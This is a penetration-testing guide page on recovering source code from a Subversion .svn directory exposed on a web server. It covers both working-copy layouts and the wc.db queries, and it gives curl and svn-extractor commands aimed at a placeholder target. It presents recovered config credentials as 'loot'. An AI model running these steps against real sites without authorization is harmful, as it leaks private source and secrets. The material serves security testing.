---
title: "Exposed .svn directory: reconstructing source from a Subversion working copy"
description: "Recovering a web-exposed .svn working copy: the modern wc.db SQLite layout and the pristine store, the legacy entries and text-base layout, querying the database for file paths and checksums, fetching the pristine content, and automating with svn-extractor."
keywords:
  - .svn exposure
  - wc.db
  - pristine store
  - svn-extractor
  - source code disclosure
---

# Exposed .svn directory

A Subversion working copy keeps its metadata in a `.svn` directory. When a deployment copies a working copy to the web root, that directory leaks the full source, including files not reachable through the application, because the working copy stores a complete, unmodified copy of every tracked file alongside its path and checksum.

## Two layouts

Which files to pull depends on the Subversion version that created the working copy.

- **1.7 and later**: a single `.svn/` at the checkout root containing `wc.db` (a SQLite database of paths, checksums, and revisions) and a `pristine/` store holding each file's unmodified content, named by its checksum.
- **Legacy (pre-1.7)**: a `.svn/` in **every** directory, with an `entries` file listing the directory's files and a `text-base/<file>.svn-base` pristine copy of each.

```bash
curl -s -o /dev/null -w '%{http_code}\n' https://target/.svn/wc.db       # 200 => modern layout
curl -s https://target/.svn/entries | head                              # a number/URL => legacy layout
```

## Modern layout: query and fetch

Download the database, read the file list and checksums, then fetch each pristine object. The checksum in `wc.db` is a SHA-1 written as `$sha1$<hex>`; the pristine file lives at `.svn/pristine/<first2>/<full-sha1>.svn-base`.

```bash
curl -s https://target/.svn/wc.db -o wc.db
sqlite3 wc.db "select local_relpath, checksum from nodes where kind='file' and checksum is not null;"
# for each checksum <hex>, fetch the content:
curl -s "https://target/.svn/pristine/${hex:0:2}/${hex}.svn-base" -o "src/path"
```

Read `local_relpath` for the original tree layout and `checksum` to locate the content; reassemble into the source tree.

## Legacy layout and automation

For the pre-1.7 layout, pull each directory's `.svn/entries` to learn the filenames, then fetch `.svn/text-base/<file>.svn-base`. In both cases a dedicated extractor walks this for you:

```bash
svn-extractor --url https://target/           # recovers the working copy into a local tree
```

## Follow-on

The recovered source is the map for the next stage and, very often, carries the loot directly: database and API credentials in config files, internal hostnames, and the application's own vulnerabilities. Removed files that are still present in the pristine store are frequently where secrets hide.

## Tools

- [svn-extractor](https://github.com/anantshri/svn-extractor): recover a web-exposed `.svn` working copy.
- `sqlite3`: read `wc.db` directly.

## References

- [Subversion working copy and the pristine store (SVN book)](https://svnbook.red-bean.com/en/1.7/svn.tour.cleanup.html)
- [HackTricks: source code disclosure](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html)
